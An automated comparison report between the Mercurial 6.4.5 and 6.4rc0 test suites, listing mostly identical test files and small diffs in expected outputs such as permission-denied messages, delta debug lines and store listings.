### Comparing `mercurial-6.4.5/tests/test-revlog-ancestry.py` & `mercurial-6.4rc0/tests/test-revlog-ancestry.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revlog-delta-find.t` & `mercurial-6.4rc0/tests/test-revlog-delta-find.t`

 * *Files 6% similar despite different names*

```diff
@@ -325,38 +325,9 @@
   $ cp -ar local-pre-pull-full local-forced-full-p1
   $ hg -R local-forced-full-p1 pull --quiet \
   > --config 'paths.*:pulled-delta-reuse-policy=forced' all-p1.hg
   DBG-DELTAS: CHANGELOG: * (glob)
   DBG-DELTAS: CHANGELOG: * (glob)
   DBG-DELTAS: MANIFESTLOG: * (glob)
   DBG-DELTAS: MANIFESTLOG: * (glob)
-  DBG-DELTAS: FILELOG:my-file.txt: rev=3: delta-base=2 is-cached=1 *search-rounds=0 try-count=0* (glob)
-  DBG-DELTAS: FILELOG:my-file.txt: rev=4: delta-base=3 is-cached=1 *search-rounds=0 try-count=0* (glob)
-
-Check that running "forced" on a non-general delta repository does not corrupt it
----------------------------------------------------------------------------------
-
-Even if requested to be used, some of the delta in the revlog cannot be stored on a non-general delta repository. We check that the bundle application was correct.
-
-  $ hg init \
-  >    --config format.usegeneraldelta=no \
-  >    --config format.sparse-revlog=no \
-  >    local-forced-full-p1-no-gd
-  $ hg debugformat -R local-forced-full-p1-no-gd | grep generaldelta
-  generaldelta:        no
-  $ hg -R local-forced-full-p1-no-gd pull --quiet local-pre-pull-full \
-  >    --config debug.revlog.debug-delta=no
-  $ hg -R local-forced-full-p1-no-gd pull --quiet \
-  > --config 'paths.*:pulled-delta-reuse-policy=forced' all-p1.hg
-  DBG-DELTAS: CHANGELOG: * (glob)
-  DBG-DELTAS: CHANGELOG: * (glob)
-  DBG-DELTAS: MANIFESTLOG: * (glob)
-  DBG-DELTAS: MANIFESTLOG: * (glob)
-  DBG-DELTAS: FILELOG:my-file.txt: rev=3: delta-base=0 * - search-rounds=1 try-count=1 * (glob)
-  DBG-DELTAS: FILELOG:my-file.txt: rev=4: delta-base=4 * - search-rounds=1 try-count=1 * (glob)
-  $ hg -R local-forced-full-p1-no-gd verify
-  checking changesets
-  checking manifests
-  crosschecking files in changesets and manifests
-  checking files
-  checking dirstate
-  checked 5 changesets with 5 changes to 1 files
+  DBG-DELTAS: FILELOG:my-file.txt: rev=3: delta-base=2 * (glob)
+  DBG-DELTAS: FILELOG:my-file.txt: rev=4: delta-base=3 * (glob)
```

### Comparing `mercurial-6.4.5/tests/test-revlog-group-emptyiter.t` & `mercurial-6.4rc0/tests/test-revlog-group-emptyiter.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revlog-mmapindex.t` & `mercurial-6.4rc0/tests/test-revlog-mmapindex.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revlog-raw.py` & `mercurial-6.4rc0/tests/test-revlog-raw.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revlog-v2.t` & `mercurial-6.4rc0/tests/test-revlog-v2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revlog.t` & `mercurial-6.4rc0/tests/test-revlog.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revset-dirstate-parents.t` & `mercurial-6.4rc0/tests/test-revset-dirstate-parents.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revset-legacy-lookup.t` & `mercurial-6.4rc0/tests/test-revset-legacy-lookup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revset-outgoing.t` & `mercurial-6.4rc0/tests/test-revset-outgoing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revset.t` & `mercurial-6.4rc0/tests/test-revset.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revset2.t` & `mercurial-6.4rc0/tests/test-revset2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rhg-no-generaldelta.t` & `mercurial-6.4rc0/tests/test-rhg-no-generaldelta.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rhg-sparse-narrow.t` & `mercurial-6.4rc0/tests/test-rhg-sparse-narrow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rhg.t` & `mercurial-6.4rc0/tests/test-rhg.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rollback.t` & `mercurial-6.4rc0/tests/test-rollback.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-run-tests.py` & `mercurial-6.4rc0/tests/test-run-tests.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-run-tests.t` & `mercurial-6.4rc0/tests/test-run-tests.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rust-ancestor.py` & `mercurial-6.4rc0/tests/test-rust-ancestor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rust-discovery.py` & `mercurial-6.4rc0/tests/test-rust-discovery.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rust-revlog.py` & `mercurial-6.4rc0/tests/test-rust-revlog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-schemes.t` & `mercurial-6.4rc0/tests/test-schemes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-serve.t` & `mercurial-6.4rc0/tests/test-serve.t`

 * *Files 2% similar despite different names*

```diff
@@ -51,15 +51,15 @@
 #
 # On some others the kernel is configured to allow any user to bind them and
 # this will work fine
 
 #if no-windows
   $ KILLQUIETLY=Y
   $ hgserve -p daytime
-  abort: cannot start server at 'localhost:13': $EACCES$ (?)
+  abort: cannot start server at 'localhost:13': Permission denied (?)
   abort: child process failed to start (?)
   abort: no port number associated with service 'daytime' (?)
   listening at http://localhost/ (bound to $LOCALIP:13) (?)
   % errors
   $ KILLQUIETLY=N
 #endif
```

### Comparing `mercurial-6.4.5/tests/test-server-view.t` & `mercurial-6.4rc0/tests/test-server-view.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-setdiscovery.t` & `mercurial-6.4rc0/tests/test-setdiscovery.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-share-bookmarks.t` & `mercurial-6.4rc0/tests/test-share-bookmarks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-share-safe.t` & `mercurial-6.4rc0/tests/test-share-safe.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-share.t` & `mercurial-6.4rc0/tests/test-share.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-shelve.t` & `mercurial-6.4rc0/tests/test-shelve.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-shelve2.t` & `mercurial-6.4rc0/tests/test-shelve2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-show-stack.t` & `mercurial-6.4rc0/tests/test-show-stack.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-show-work.t` & `mercurial-6.4rc0/tests/test-show-work.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-show.t` & `mercurial-6.4rc0/tests/test-show.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sidedata-exchange.t` & `mercurial-6.4rc0/tests/test-sidedata-exchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sidedata.t` & `mercurial-6.4rc0/tests/test-sidedata.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-simple-update.t` & `mercurial-6.4rc0/tests/test-simple-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-simplekeyvaluefile.py` & `mercurial-6.4rc0/tests/test-simplekeyvaluefile.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-simplemerge.py` & `mercurial-6.4rc0/tests/test-simplemerge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A1.t` & `mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A2.t` & `mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A3.t` & `mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A4.t` & `mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A5.t` & `mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-single-head.t` & `mercurial-6.4rc0/tests/test-single-head.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-clear.t` & `mercurial-6.4rc0/tests/test-sparse-clear.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-clone.t` & `mercurial-6.4rc0/tests/test-sparse-clone.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-fsmonitor.t` & `mercurial-6.4rc0/tests/test-sparse-fsmonitor.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-import.t` & `mercurial-6.4rc0/tests/test-sparse-import.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-merges.t` & `mercurial-6.4rc0/tests/test-sparse-merges.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-profiles.t` & `mercurial-6.4rc0/tests/test-sparse-profiles.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-requirement.t` & `mercurial-6.4rc0/tests/test-sparse-requirement.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-revlog.t` & `mercurial-6.4rc0/tests/test-sparse-revlog.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse-verbose-json.t` & `mercurial-6.4rc0/tests/test-sparse-verbose-json.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sparse.t` & `mercurial-6.4rc0/tests/test-sparse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-split.t` & `mercurial-6.4rc0/tests/test-split.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-sqlitestore.t` & `mercurial-6.4rc0/tests/test-sqlitestore.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ssh-batch.t` & `mercurial-6.4rc0/tests/test-ssh-batch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ssh-bundle1.t` & `mercurial-6.4rc0/tests/test-ssh-bundle1.t`

 * *Files 0% similar despite different names*

```diff
@@ -399,17 +399,17 @@
 
   $ cd read-only-local
   $ echo "baz" > bar
   $ hg ci -A -m "unpushable commit" bar
   $ hg push --ssh "sh ../ssh.sh"
   pushing to ssh://user@dummy/*/remote (glob)
   searching for changes
-  remote: $EACCES$
+  remote: Permission denied
   remote: abort: pretxnopen.hg-ssh hook failed
-  remote: $EACCES$
+  remote: Permission denied
   remote: pushkey-abort: prepushkey.hg-ssh hook failed
   updating 6c0482d977a3 to public failed!
   [1]
 
   $ cd $TESTTMP
 
 stderr from remote commands should be printed before stdout from local code (issue4336)
```

### Comparing `mercurial-6.4.5/tests/test-ssh-clone-r.t` & `mercurial-6.4rc0/tests/test-ssh-clone-r.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ssh-proto-unbundle.t` & `mercurial-6.4rc0/tests/test-ssh-proto-unbundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ssh-proto.t` & `mercurial-6.4rc0/tests/test-ssh-proto.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ssh-repoerror.t` & `mercurial-6.4rc0/tests/test-ssh-repoerror.t`

 * *Files 12% similar despite different names*

```diff
@@ -9,15 +9,15 @@
 
   $ hg init no-read
   $ hg id ssh://user@dummy/no-read
   000000000000
   $ chmod a-rx no-read
 
   $ hg id ssh://user@dummy/no-read
-  remote: abort: $EACCES$: *$TESTTMP/no-read/.hg* (glob)
+  remote: abort: Permission denied: *$TESTTMP/no-read/.hg* (glob)
   abort: no suitable response from remote hg
   [255]
 
 special case files are visible, but unreadable
 ----------------------------------------------
 
 This is "similar" to the test above, but the directory is "traversable". This
@@ -27,15 +27,15 @@
   $ hg id ssh://user@dummy/other
   000000000000
   $ for item in `find other | sort -r` ; do
   >     chmod a-r $item
   > done
 
   $ hg id ssh://user@dummy/other
-  remote: abort: $EACCES$: '$TESTTMP/other/.hg/requires'
+  remote: abort: Permission denied: '$TESTTMP/other/.hg/requires'
   abort: no suitable response from remote hg
   [255]
 
 directory toward the repository is read only
 --------------------------------------------
 
   $ mkdir deep
@@ -43,15 +43,15 @@
 
   $ hg id ssh://user@dummy/deep/nested
   000000000000
 
   $ chmod a-rx deep
 
   $ hg id ssh://user@dummy/deep/nested
-  remote: abort: $EACCES$: *$TESTTMP/deep/nested/.hg* (glob)
+  remote: abort: Permission denied: *$TESTTMP/deep/nested/.hg* (glob)
   abort: no suitable response from remote hg
   [255]
 
 repository has wrong requirement
 --------------------------------
 
   $ hg init repo-future
```

### Comparing `mercurial-6.4.5/tests/test-ssh.t` & `mercurial-6.4rc0/tests/test-ssh.t`

 * *Files 0% similar despite different names*

```diff
@@ -452,15 +452,15 @@
 
   $ cd read-only-local
   $ echo "baz" > bar
   $ hg ci -A -m "unpushable commit" bar
   $ hg push --ssh "sh ../ssh.sh"
   pushing to ssh://user@dummy/*/remote (glob)
   searching for changes
-  remote: $EACCES$
+  remote: Permission denied
   remote: pretxnopen.hg-ssh hook failed
   abort: push failed on remote
   [100]
 
   $ cd $TESTTMP
 
 stderr from remote commands should be printed before stdout from local code (issue4336)
```

### Comparing `mercurial-6.4.5/tests/test-sshserver.py` & `mercurial-6.4rc0/tests/test-sshserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-stack.t` & `mercurial-6.4rc0/tests/test-stack.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-state-extension.t` & `mercurial-6.4rc0/tests/test-state-extension.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-static-http.t` & `mercurial-6.4rc0/tests/test-static-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status-color.t` & `mercurial-6.4rc0/tests/test-status-color.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status-inprocess.py` & `mercurial-6.4rc0/tests/test-status-inprocess.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status-rev.t` & `mercurial-6.4rc0/tests/test-status-rev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status-terse.t` & `mercurial-6.4rc0/tests/test-status-terse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status-tracked-key.t` & `mercurial-6.4rc0/tests/test-status-tracked-key.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-status.t` & `mercurial-6.4rc0/tests/test-status.t`

 * *Files 1% similar despite different names*

```diff
@@ -845,15 +845,15 @@
 
 Not having permission to read a directory that contains tracked files makes
 status emit a warning then behave as if the directory was empty or removed
 entirely:
 
   $ chmod 0 subdir
   $ hg status --include subdir
-  subdir: $EACCES$
+  subdir: Permission denied
   R subdir/removed
   ! subdir/clean
   ! subdir/deleted
   ! subdir/modified
   $ chmod 755 subdir
 
 #endif
@@ -996,31 +996,7 @@
 One invocation of status is enough to populate the cache even if it's invalidated
 in the same run.
 
   $ hg debugdirstate --all --no-dates | grep '^ '
       0         -1 set                 subdir
 
 #endif
-
-
-Test copy source formatting.
-  $ cd ..
-  $ hg init copy-source-repo
-  $ cd copy-source-repo
-  $ mkdir -p foo/bar
-  $ cd foo/bar
-  $ touch file
-  $ hg addremove
-  adding foo/bar/file
-  $ hg commit -m 'add file'
-  $ hg mv file copy
-
-Copy source respects relative path setting.
-  $ hg st --config ui.statuscopies=true --config commands.status.relative=true
-  A copy
-    file
-  R file
-
-Copy source is not shown when --no-status is passed.
-  $ hg st --config ui.statuscopies=true --no-status
-  foo/bar/copy
-  foo/bar/file
```

### Comparing `mercurial-6.4.5/tests/test-stdio.py` & `mercurial-6.4rc0/tests/test-stdio.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-storage.py` & `mercurial-6.4rc0/tests/test-storage.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-stream-bundle-v2.t` & `mercurial-6.4rc0/tests/test-stream-bundle-v2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-strip-branch-cache.t` & `mercurial-6.4rc0/tests/test-strip-branch-cache.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-strip-cross.t` & `mercurial-6.4rc0/tests/test-strip-cross.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-strip.t` & `mercurial-6.4rc0/tests/test-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-deep-nested-change.t` & `mercurial-6.4rc0/tests/test-subrepo-deep-nested-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-git.t` & `mercurial-6.4rc0/tests/test-subrepo-git.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-missing.t` & `mercurial-6.4rc0/tests/test-subrepo-missing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-paths.t` & `mercurial-6.4rc0/tests/test-subrepo-paths.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-recursion.t` & `mercurial-6.4rc0/tests/test-subrepo-recursion.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-relative-path.t` & `mercurial-6.4rc0/tests/test-subrepo-relative-path.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo-svn.t` & `mercurial-6.4rc0/tests/test-subrepo-svn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-subrepo.t` & `mercurial-6.4rc0/tests/test-subrepo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-symlink-os-yes-fs-no.py` & `mercurial-6.4rc0/tests/test-symlink-os-yes-fs-no.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-symlink-placeholder.t` & `mercurial-6.4rc0/tests/test-symlink-placeholder.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-symlinks.t` & `mercurial-6.4rc0/tests/test-symlinks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-tag.t` & `mercurial-6.4rc0/tests/test-tag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-tags.t` & `mercurial-6.4rc0/tests/test-tags.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-template-basic.t` & `mercurial-6.4rc0/tests/test-template-basic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-template-functions.t` & `mercurial-6.4rc0/tests/test-template-functions.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-template-graph.t` & `mercurial-6.4rc0/tests/test-template-graph.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-template-keywords.t` & `mercurial-6.4rc0/tests/test-template-keywords.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-template-map.t` & `mercurial-6.4rc0/tests/test-template-map.t`

 * *Files 1% similar despite different names*

```diff
@@ -1256,15 +1256,15 @@
 
 Error if style not readable:
 
 #if unix-permissions no-root
   $ touch q
   $ chmod 0 q
   $ hg log --style ./q
-  abort: $EACCES$: './q'
+  abort: Permission denied: './q'
   [255]
 #endif
 
 Error if no style:
 
   $ hg log --style notexist
   abort: style 'notexist' not found
@@ -1305,15 +1305,15 @@
   [10]
 
 Error if include fails:
 
   $ echo 'changeset = q' >> t
 #if unix-permissions no-root
   $ hg log --style ./t
-  abort: template file ./q: $EACCES$
+  abort: template file ./q: Permission denied
   [255]
   $ rm -f q
 #endif
 
 Include works:
 
   $ echo '{rev}' > q
```

### Comparing `mercurial-6.4.5/tests/test-tools.t` & `mercurial-6.4rc0/tests/test-tools.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-transaction-rollback-on-sigpipe.t` & `mercurial-6.4rc0/tests/test-transaction-rollback-on-sigpipe.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-transaction-safety.t` & `mercurial-6.4rc0/tests/test-transaction-safety.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-transaction-wc-rollback-race.t` & `mercurial-6.4rc0/tests/test-transaction-wc-rollback-race.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-transplant.t` & `mercurial-6.4rc0/tests/test-transplant.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-treediscovery-legacy.t` & `mercurial-6.4rc0/tests/test-treediscovery-legacy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-treediscovery.t` & `mercurial-6.4rc0/tests/test-treediscovery.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-treemanifest.t` & `mercurial-6.4rc0/tests/test-treemanifest.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-trusted.py` & `mercurial-6.4rc0/tests/test-trusted.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-trusted.py.out` & `mercurial-6.4rc0/tests/test-trusted.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ui-color.py` & `mercurial-6.4rc0/tests/test-ui-color.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ui-config.py` & `mercurial-6.4rc0/tests/test-ui-config.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ui-config.py.out` & `mercurial-6.4rc0/tests/test-ui-config.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ui-verbosity.py` & `mercurial-6.4rc0/tests/test-ui-verbosity.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ui-verbosity.py.out` & `mercurial-6.4rc0/tests/test-ui-verbosity.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-unamend.t` & `mercurial-6.4rc0/tests/test-unamend.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-unbundlehash.t` & `mercurial-6.4rc0/tests/test-unbundlehash.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-uncommit.t` & `mercurial-6.4rc0/tests/test-uncommit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-unified-test.t` & `mercurial-6.4rc0/tests/test-unified-test.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-unionrepo.t` & `mercurial-6.4rc0/tests/test-unionrepo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-unrelated-pull.t` & `mercurial-6.4rc0/tests/test-unrelated-pull.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-up-local-change.t` & `mercurial-6.4rc0/tests/test-up-local-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-atomic.t` & `mercurial-6.4rc0/tests/test-update-atomic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-branches.t` & `mercurial-6.4rc0/tests/test-update-branches.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-dest.t` & `mercurial-6.4rc0/tests/test-update-dest.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-issue1456.t` & `mercurial-6.4rc0/tests/test-update-issue1456.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-names.t` & `mercurial-6.4rc0/tests/test-update-names.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-update-reverse.t` & `mercurial-6.4rc0/tests/test-update-reverse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-upgrade-repo.t` & `mercurial-6.4rc0/tests/test-upgrade-repo.t`

 * *Files 0% similar despite different names*

```diff
@@ -835,15 +835,14 @@
 
 store directory has files we expect
 
   $ ls .hg/store
   00changelog.i
   00manifest.i
   data
-  data-s
   fncache
   phaseroots
   requires
   undo
   undo.backupfiles
 
 manifest should be generaldelta
@@ -859,15 +858,14 @@
 
   $ ls -d .hg/upgradebackup.*/
   .hg/upgradebackup.*/ (glob)
   $ ls .hg/upgradebackup.*/store
   00changelog.i
   00manifest.i
   data
-  data-s
   fncache
   phaseroots
   requires
   undo
   undo.backup.fncache
   undo.backupfiles
```

### Comparing `mercurial-6.4.5/tests/test-url-download.t` & `mercurial-6.4rc0/tests/test-url-download.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-url-rev.t` & `mercurial-6.4rc0/tests/test-url-rev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-url.py` & `mercurial-6.4rc0/tests/test-url.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-username-newline.t` & `mercurial-6.4rc0/tests/test-username-newline.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-util.py` & `mercurial-6.4rc0/tests/test-util.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-verify-repo-operations.py` & `mercurial-6.4rc0/tests/test-verify-repo-operations.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-verify.t` & `mercurial-6.4rc0/tests/test-verify.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-walk.t` & `mercurial-6.4rc0/tests/test-walk.t`

 * *Files 1% similar despite different names*

```diff
@@ -532,15 +532,15 @@
   <patternmatcher patterns='(?:|.*/)Procyonidae/.*$|fennel(?:/|$)'>
   f  fennel                          fennel                          exact
   f  mammals/Procyonidae/cacomistle  mammals/Procyonidae/cacomistle
   f  mammals/Procyonidae/coatimundi  mammals/Procyonidae/coatimundi
   f  mammals/Procyonidae/raccoon     mammals/Procyonidae/raccoon
   $ hg debugwalk -v beans 'glob:beans/*'
   * matcher:
-  <patternmatcher patterns='beans/[^/]*$|beans(?:/|$)'>
+  <patternmatcher patterns='beans(?:/|$)|beans/[^/]*$'>
   f  beans/black     beans/black
   f  beans/borlotti  beans/borlotti
   f  beans/kidney    beans/kidney
   f  beans/navy      beans/navy
   f  beans/pinto     beans/pinto
   f  beans/turtle    beans/turtle
   $ hg debugwalk -v 'glob:mamm**'
```

### Comparing `mercurial-6.4.5/tests/test-walkrepo.py` & `mercurial-6.4rc0/tests/test-walkrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-websub.t` & `mercurial-6.4rc0/tests/test-websub.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-win32text.t` & `mercurial-6.4rc0/tests/test-win32text.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wireproto-clientreactor.py` & `mercurial-6.4rc0/tests/test-wireproto-clientreactor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wireproto-framing.py` & `mercurial-6.4rc0/tests/test-wireproto-framing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wireproto-serverreactor.py` & `mercurial-6.4rc0/tests/test-wireproto-serverreactor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wireproto.py` & `mercurial-6.4rc0/tests/test-wireproto.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wireproto.t` & `mercurial-6.4rc0/tests/test-wireproto.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-worker.t` & `mercurial-6.4rc0/tests/test-worker.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-wsgirequest.py` & `mercurial-6.4rc0/tests/test-wsgirequest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/badserverext.py` & `mercurial-6.4rc0/tests/testlib/badserverext.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/crash_transaction_late.py` & `mercurial-6.4rc0/tests/testlib/crash_transaction_late.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/exchange-obsmarker-util.sh` & `mercurial-6.4rc0/tests/testlib/exchange-obsmarker-util.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-phase-report.py` & `mercurial-6.4rc0/tests/testlib/ext-phase-report.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-sidedata-2.py` & `mercurial-6.4rc0/tests/testlib/ext-sidedata-2.py`

 * *Files identical despite different names*

